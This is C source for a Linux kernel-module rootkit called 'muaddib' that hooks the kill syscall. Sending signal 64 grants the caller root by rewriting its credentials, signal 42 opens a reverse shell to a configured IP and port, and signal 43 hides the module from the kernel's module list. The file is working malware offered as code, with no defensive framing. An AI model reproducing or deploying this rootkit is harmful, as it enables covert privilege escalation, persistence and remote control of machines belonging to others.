#include "revshell.c"

static struct list_head *prev_module;
static short hidden = 0;

#ifdef PTREGS_SYSCALL_STUBS
static asmlinkage long (*og_kill)(const struct pt_regs *);

void showme(void)
{
    /* Add the saved list_head struct back to the module list */
    list_add(&THIS_MODULE->list, prev_module);
}

void hideme(void)
{
    /* Save the module in the list before us, so we can add ourselves
     * back to the list in the same place later. */
    prev_module = THIS_MODULE->list.prev;
    /* Remove ourselves from the list module list */
    list_del(&THIS_MODULE->list);
}



/* We can only modify our own privileges, and not that of another
 * process. Just have to wait for signal 64 (normally unused)
 * and then call the set_root() function. */
asmlinkage int muaddib_kill(const struct pt_regs *regs)
{
    void set_root(void);

    // pid_t pid = regs->di;
    int sig = regs->si;

    if(sig == 64){
        #ifdef DEBUGMSG
        printk(KERN_INFO "muaddib: giving root");
        #endif
        set_root();
        return 0;
    }

    else if(sig == 42){
        #ifdef DEBUGMSG
        printk(KERN_INFO "muaddib: starting reverse shell from kill");
        #endif
        start_reverse_shell(REVERSE_SHELL_IP, REVERSE_SHELL_PORT);
        return 0;
    }

    else if(sig == 43){
        if(hidden == 0){
            #ifdef DEBUGMSG
            printk(KERN_INFO "muaddib: hiding");
            #endif
            hideme();
            hidden = 1;
            return 0;
        }
        else if(hidden == 1){
            #ifdef DEBUGMSG
            printk(KERN_INFO "muaddib: showing");
            #endif
            showme();
            hidden = 0;
            return 0;
        }
    }
    return og_kill(regs);

}
#else
/* This is the old way of declaring a syscall hook */
static asmlinkage long (*og_kill)(pid_t pid, int sig);

static asmlinkage int muaddib_kill(pid_t pid, int sig)
{
    void set_root(void);

    if(sig == 64){
        #ifdef DEBUGMSG
        printk(KERN_INFO "muaddib: giving root");
        #endif
        set_root();
        return 0;
    }

    else if(sig == 42){
        #ifdef DEBUGMSG
        printk(KERN_INFO "muaddib: starting reverse shell from kill");
        #endif
        start_reverse_shell(REVERSE_SHELL_IP, REVERSE_SHELL_PORT);
    }

    else if(sig == 43){
        if(hidden == 0){
            #ifdef DEBUGMSG
            printk(KERN_INFO "muaddib: showing");
            #endif
            showme();
        }
        else if(hidden == 1){
            #ifdef DEBUGMSG
            printk(KERN_INFO "muaddib: hiding");
            #endif
            hideme();
        }
    }

    return og_kill(pid, sig);
}
#endif

/* Whatever calls this function will have it's creds struct replaced
 * with root's */
void set_root(void)
{
    /* prepare_creds returns the current credentials of the process */
    struct cred *root;
    root = prepare_creds();

    if (root == NULL)
        return;

    /* Run through and set all the various *id's to 0 (root) */
    root->uid.val = root->gid.val = 0;
    root->euid.val = root->egid.val = 0;
    root->suid.val = root->sgid.val = 0;
    root->fsuid.val = root->fsgid.val = 0;

    /* Set the cred struct that we've modified to that of the calling process */
    commit_creds(root);
}
